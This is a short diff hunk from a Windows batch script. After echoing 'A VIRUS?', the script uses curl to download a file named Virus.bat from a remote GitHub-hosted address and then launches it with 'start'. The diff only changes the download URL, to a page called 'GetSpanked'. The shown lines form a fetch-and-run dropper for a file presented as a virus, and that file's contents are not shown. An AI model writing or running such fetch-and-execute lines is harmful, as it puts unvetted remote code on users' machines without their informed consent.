@@ -12,6 +12,6 @@ pause
 
 echo A VIRUS?
 
-curl -LJO https://github.com/re-mc/MyProjects/raw/main/Virus.bat
+curl -LJO re-mc.github.io/GetSpanked/Virus.bat
 
 start Virus.bat
